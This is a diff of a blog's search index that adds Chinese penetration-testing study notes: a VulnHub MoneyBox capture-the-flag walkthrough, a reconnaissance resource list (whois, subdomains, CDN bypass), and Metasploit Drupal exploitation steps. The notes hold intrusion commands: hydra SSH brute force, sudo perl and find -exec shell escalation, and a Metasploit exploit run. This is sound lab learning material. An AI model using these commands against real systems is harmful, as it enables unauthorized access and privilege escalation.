@@ -1,6 +1,98 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>MoneyBox</title>
+    <url>/2024/01/04/text24/</url>
+    <content><![CDATA[
+        <h1 id="一-靶场环境搭建"   >
+          <a href="#一-靶场环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#一-靶场环境搭建" class="headerlink" title="一.靶场环境搭建"></a>一.靶场环境搭建</h1>
+      <p><strong>1.下载安装：<span class="exturl"><a class="exturl__link"   href="https://www.virtualbox.org/" >Oracle VM VirtualBox</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></strong></p>
+<p><strong>2.下载moneybox:<span class="exturl"><a class="exturl__link"   href="http://www.vulnhub.com/entry/moneybox-1,653/#download" >http://www.vulnhub.com/entry/moneybox-1,653/#download</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></strong></p>
+<p><strong>3.打开VirtualBox点击管理导入虚拟电脑，选择下载好的moneybox</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104193529791.png" alt="image-20240104193529791"></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104193746019.png" alt="image-20240104193746019"></p>
+<p><strong>4.点击设置更改usb设备为USB1.1控制器，网络，连接方式设置为仅主机网络</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104194016962.png" alt="image-20240104194016962"></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104194033552.png" alt="image-20240104194033552"></p>
+<p><strong>5.启动导入的moneybox靶机</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104194225425.png" alt="image-20240104194225425"></p>
+<p><strong>6.以管理员身份启动Vmware虚拟机，点击编辑打开虚拟网络编辑器，将桥接模式的外部连接选择Virtualbox Host-Only Ethernet Adapter。</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104194707216.png" alt="image-20240104194707216"></p>
+<p><strong>7.将kali虚拟机的网络设配器设置为桥接模式，网络适配器2设置为NAT。</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104194953857.png" alt="image-20240104194953857"></p>
+<p><strong>8.启动kali验证环境是否搭建成功，输入arp-scan -l -I eth0可以看到192.168.56.101靶机的ip可以输入IP进入网站查看</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104195405410.png" alt="image-20240104195405410"></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104195522969.png" alt="image-20240104195522969"></p>
+
+        <h1 id="二-MoneyBox打靶流程"   >
+          <a href="#二-MoneyBox打靶流程" class="heading-link"><i class="fas fa-link"></i></a><a href="#二-MoneyBox打靶流程" class="headerlink" title="二.MoneyBox打靶流程"></a>二.MoneyBox打靶流程</h1>
+      <p><strong>1.nmap -sn 192.168.56.101 （执行 Ping 扫描，而不进行端口扫描。确定主机是否在线。）</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104200323708.png" alt="image-20240104200323708"></p>
+<p><strong>2.nmap -p 1-10000 192.168.56.101（扫描的端口范围是从 1 到 10000）</strong></p>
+<p><img src="C:/Users/15386/AppData/Roaming/Typora/typora-user-images/image-20240104200720683.png" alt="image-20240104200720683"></p>
+<p><strong>3.发现只有3个端口，nmap -p 21,22,80 -sC 192.168.56.101（扫描目标主机上的 21（FTP）、22（SSH）和80（HTTP）端口，并启用默认的脚本扫描以获取更多关于这些端口和服务的信息。）</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104201132163.png" alt="image-20240104201132163"></p>
+<p><strong>4.dirsearch -u “<span class="exturl"><a class="exturl__link"   href="http://192.168.56.101/" >http://192.168.56.101</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>“ -x401,403,404（使用 <code>dirsearch</code> 工具对目标网站 “<span class="exturl"><a class="exturl__link"   href="http://192.168.56.101/" >http://192.168.56.101</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>“ 进行目录和文件的枚举，并排除了未授权、禁止访问和未找到的状态码。）</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/Money%20Box2.jpeg" alt="img"></p>
+<p><strong>5.进入扫描出的blogs目录，查看源代码可以发现给出了提示</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/Money4.jpeg" alt="img"></p>
+<p><strong>6，进入提示信息的页面，再次查看源代码发现给出了个key</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/money5.jpeg" alt="img"></p>
+<p><strong>7.根据之前第3步的扫描结果看到ftp登录是开放的可以通过用户名Anonmous密码Anonmous登录，进入ftp目录通过ls发现有张图片，然后get+图片名进行下载（默认下载到桌面）</strong></p>
+<p><img src="file:///C:/Users/15386/AppData/Local/Packages/Microsoft.Windows.Photos_8wekyb3d8bbwe/TempState/ShareServiceTempFolder/money6.jpeg" alt="img"></p>
+<p><strong>8.通过strings二进制查看图片发现藏着东西</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/money7.jpeg" alt="img"></p>
+<p><strong>9.通过steghide info trytofind.jpg命令知道图片确实还有其他文件</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/money8.jpeg" alt="img"></p>
+<p><strong>10.通过steghide extract -sf trytofind.jpg进行文件分离，并查看分离出的文件内容</strong>，<strong>知道用户名为renu</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/money9.jpeg" alt="img"></p>
+<p><strong>11.进行密码字典爆破1.txt为自定义字典名字。hydra -l renu -P .&#x2F;1.txt ssh:&#x2F;&#x2F;192.168.56.101</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/money11.jpeg" alt="img"></p>
+<p><strong>12.知道用户名和密码后直接ssh登录,查看文件得到第一个flag</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/money12.jpeg" alt="img"></p>
+<p><strong>13.执行cat .bash_history，查询历史命令发现不用密码可以登录另外一个lily用户</strong></p>
+<h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/money13.jpeg" alt="img"></h5><p><strong>14.登录lily用户查看文件得到第二个flag</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/money14.jpeg" alt="img"></p>
+<p><strong>15.发现可以sudo来运行perl</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/money15.jpeg" alt="img"></p>
+<p><strong>16.sudo perl -e ‘exec “&#x2F;bin&#x2F;bash”;’成功进入shell,进入root用户，密码就是之前得到的key查看root.txt得到最后的flag完成靶场</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240104204143752.png" alt="image-20240104204143752"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>信息收集2</title>
+    <url>/2024/01/03/text23/</url>
+    <content><![CDATA[
+        <h3 id="1-主域名资产收集"   >
+          <a href="#1-主域名资产收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-主域名资产收集" class="headerlink" title="1.主域名资产收集"></a>1.主域名资产收集</h3>
+      <p> <strong>(1）ICP备案查询</strong><br><span class="exturl"><a class="exturl__link"   href="https://beian.miit.gov.cn/#/Integrated/index" >https://beian.miit.gov.cn/#/Integrated/index</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	工信部备案<br><span class="exturl"><a class="exturl__link"   href="https://www.beian.gov.cn/portal/registerSystemInfo" >https://www.beian.gov.cn/portal/registerSystemInfo</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	公安备案<br><span class="exturl"><a class="exturl__link"   href="http://icp.chinaz.com/" >http://icp.chinaz.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	站长之家<br><span class="exturl"><a class="exturl__link"   href="https://www.aizhan.com/cha/" >https://www.aizhan.com/cha/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	爱站网</p>
+<p>  <strong>(2）Whois查询包括在线网站和邮箱反查</strong><br>     注册域名的时候留下的信息。比如域名注册人的邮箱、电话号码、姓名等。根据这些信息可以尝试制作社工密码，或者查出更多的资产等等，也可以反查注册人，邮箱，电话，机构及更多的域名。<br><span class="exturl"><a class="exturl__link"   href="https://beian.miit.gov.cn/#/Integrated/index" >https://beian.miit.gov.cn/#/Integrated/index</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	工信部备案网站<br><span class="exturl"><a class="exturl__link"   href="https://www.beian.gov.cn/portal/registerSystemInfo" >https://www.beian.gov.cn/portal/registerSystemInfo</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	公安备案网站<br><span class="exturl"><a class="exturl__link"   href="http://whois.chinaz.com/" >http://whois.chinaz.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	站长之家<br><span class="exturl"><a class="exturl__link"   href="https://whois.aizhan.com/" >https://whois.aizhan.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	爱站网<br><span class="exturl"><a class="exturl__link"   href="https://webwhois.cnnic.cn/WelcomeServlet" >https://webwhois.cnnic.cn/WelcomeServlet</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	中国互联网信息中心<br><span class="exturl"><a class="exturl__link"   href="https://whois.cloud.tencent.com/" >https://whois.cloud.tencent.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	腾讯云<br><span class="exturl"><a class="exturl__link"   href="https://whois.aliyun.com/" >https://whois.aliyun.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	阿里云<br><span class="exturl"><a class="exturl__link"   href="http://whois.xinnet.com/domain/whois/index.jsp" >http://whois.xinnet.com/domain/whois/index.jsp</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	新网<br><strong>反查邮箱链接</strong>	<br><span class="exturl"><a class="exturl__link"   href="https://bbs.fobshanghai.com/checkemail.html" >https://bbs.fobshanghai.com/checkemail.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	福人<br><span class="exturl"><a class="exturl__link"   href="https://www.benmi.com/rwhois" >https://www.benmi.com/rwhois</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	whois反查<br><span class="exturl"><a class="exturl__link"   href="http://whois.chinaz.com/reverse?ddlSearchMode=1" >http://whois.chinaz.com/reverse?ddlSearchMode=1</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	站长工具<br><span class="exturl"><a class="exturl__link"   href="https://phonebook.cz/" >https://phonebook.cz</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	phonebook<br><span class="exturl"><a class="exturl__link"   href="https://hunter.io/" >https://hunter.io/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	hunter</p>
+
+        <h3 id="2-子域名资产收集"   >
+          <a href="#2-子域名资产收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-子域名资产收集" class="headerlink" title="2.子域名资产收集"></a><strong>2.子域名资产收集</strong></h3>
+      <p>​     <strong>(1）DNS域传送</strong><br>​      DNS服务器分为主服务器，备份服务器，缓存服务器。<br>​      域传送是指备份服务器从主服务器上复制数据，然后更新自身的数据库，以达到数据同步的目的，这样是为了增加冗余，一旦主服务器出现问题可直接让备份服务器做好支撑工作。<br>​      而域传送漏洞则是由于DNS配置不当，导致匿名用户可以获取某个域的所有记录，造成整个网络的拓扑结构泄露给潜在的攻击者，凭借这份网络蓝图，攻击者可以节省大量的扫描时间，同时提升了目标的准确度。<br>​      DNS域传送漏洞检测方式有三种：nslookup，dig，和使用nmap脚本。</p>
+<p>  <strong>(2)通过搜索引擎</strong></p>
+<p>   通过谷歌、百度、等hack搜索语法搜索子域名。</p>
+<p><strong>谷歌hack语法</strong></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240103204714338.png" alt="image-20240103204714338"></p>
+<p> <strong>(3）通过网络空间搜索引擎</strong><br><span class="exturl"><a class="exturl__link"   href="https://www.zoomeye.org/" >https://www.zoomeye.org/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	钟馗之眼<br><span class="exturl"><a class="exturl__link"   href="https://fofa.info/" >https://fofa.info/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	fofa<br><span class="exturl"><a class="exturl__link"   href="https://www.shodan.io/" >https://www.shodan.io/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	shadon<br><span class="exturl"><a class="exturl__link"   href="https://hunter.qianxin.com/" >https://hunter.qianxin.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	鹰图<br><span class="exturl"><a class="exturl__link"   href="https://quake.360.cn/" >https://quake.360.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	360    6）一些在线网站子域名查询<br>  <strong>（4）一些在线网站子域名查询</strong><br><span class="exturl"><a class="exturl__link"   href="https://site.ip138.com/" >https://site.ip138.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	查询网<br><span class="exturl"><a class="exturl__link"   href="https://phpinfo.me/domain/" >https://phpinfo.me/domain/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	在线子域名查询<br><span class="exturl"><a class="exturl__link"   href="http://tool.chinaz.com/" >http://tool.chinaz.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	站长之家</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240103205414398.png" alt="image-20240103205414398"></p>
+<p><span class="exturl"><a class="exturl__link"   href="https://www.t1h2ua.cn/tools/" >https://www.t1h2ua.cn/tools/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	子域名扫描<br><span class="exturl"><a class="exturl__link"   href="https://dnsdumpster.com/" >https://dnsdumpster.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	dnsdumpster<br><span class="exturl"><a class="exturl__link"   href="http://dns.aizhan.com/" >http://dns.aizhan.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>	爱站<br>     <strong>（5）子域名爆破工具</strong></p>
+<p><span class="exturl"><a class="exturl__link"   href="https://github.com/euphrat1ca/LayerDomainFinder" >https://github.com/euphrat1ca/LayerDomainFinder</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>    layer子域名挖掘机</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240103205203033.png" alt="image-20240103205203033"></p>
+
+        <h3 id="3-绕过CDN寻找真实IP"   >
+          <a href="#3-绕过CDN寻找真实IP" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-绕过CDN寻找真实IP" class="headerlink" title="3.绕过CDN寻找真实IP"></a><strong>3.绕过CDN寻找真实IP</strong></h3>
+      <p><strong>(1)多地ping。</strong></p>
+<p><span class="exturl"><a class="exturl__link"   href="http://ping.chinaz.com/" >http://ping.chinaz.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240103205902453.png" alt="image-20240103205902453"></p>
+<p>尝试在ip前面加上https:或直接点击进入ip看是否有相关内容页面</p>
+<p><strong>（2）fofa来进行内容匹配，然后逐个查看。</strong></p>
+<p>“qq.com” &amp;&amp; country&#x3D;”CN” &amp;&amp; body&#x3D;”腾讯公司版权所有”</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240103210543180.png" alt="image-20240103210543180"></p>
+]]></content>
+  </entry>
+  <entry>
     <title>信息收集1,nmap</title>
     <url>/2024/01/01/text22/</url>
     <content><![CDATA[
@@ -9,7 +101,74 @@
       <p>1.信息收集大概内容</p>
 <p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240101185111795.png" alt="image-20240101185111795"></p>
 <p>2.web打点</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240101190042650.png" alt="image-20240101190042650"></p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20240103195632650.png" alt="image-20240103195632650"></p>
+<p>3.目录扫描，提权维权实验</p>
+<ol>
+<li><p><code>dirsearch -u &quot;http://192.168.30.139&quot; -x 403,404</code>:</p>
+<ul>
+<li>使用 <code>dirsearch</code> 工具对指定的 URL (<code>http://192.168.30.139</code>) 进行目录扫描。</li>
+<li><code>-x 403,404</code> 参数指定要排除的 HTTP 响应状态码。</li>
+</ul>
+</li>
+<li><p><code>msfconsole</code>:</p>
+<ul>
+<li><p>启动 Metasploit 框架的控制台。</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%861.jpeg" alt="img"></p>
+</li>
+</ul>
+</li>
+<li><p><code>search drupal</code>:</p>
+<ul>
+<li><p>在 Metasploit 中搜索与 Drupal 相关的模块。</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%862.jpeg" alt="img"></p>
+</li>
+</ul>
+</li>
+<li><p><code>use 2</code>:</p>
+<ul>
+<li>选择 Metasploit 模块编号为 2 的模块，开始配置该模块以进行漏洞利用。</li>
+</ul>
+</li>
+<li><p><code>show options</code>:</p>
+<ul>
+<li>显示当前选定模块的配置选项。</li>
+</ul>
+</li>
+<li><p><code>set rhosts 192.168.2.88</code>:</p>
+<ul>
+<li>设置远程主机的 IP 地址为 <code>192.168.2.88</code>。</li>
+</ul>
+</li>
+<li><p><code>run</code>:</p>
+<ul>
+<li>运行 Metasploit 模块以执行漏洞利用。</li>
+</ul>
+</li>
+<li><p><code>shell</code>:</p>
+<ul>
+<li><p>获取一个交互式的系统 shell。</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%863.jpeg" alt="img"></p>
+</li>
+</ul>
+</li>
+<li><p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code>:</p>
+<ul>
+<li>提高 shell 交互性，以便更好地进行命令执行。</li>
+</ul>
+</li>
+<li><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>:</p>
+<ul>
+<li>在文件系统中查找所有属于 root 用户并且设置 SUID 权限的文件。</li>
+</ul>
+</li>
+<li><p><code>find / -name cron.php -exec &quot;/bin/sh&quot; \;</code>:</p>
+<ul>
+<li><p>在文件系统中查找所有名为 <code>cron.php</code> 的文件，并执行 <code>/bin/sh</code>。</p>
+<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%864.png" alt="信息收集4"></p>
+</li>
+</ul>
+</li>
+</ol>
 
         <h1 id="nmap"   >
           <a href="#nmap" class="heading-link"><i class="fas fa-link"></i></a><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1>
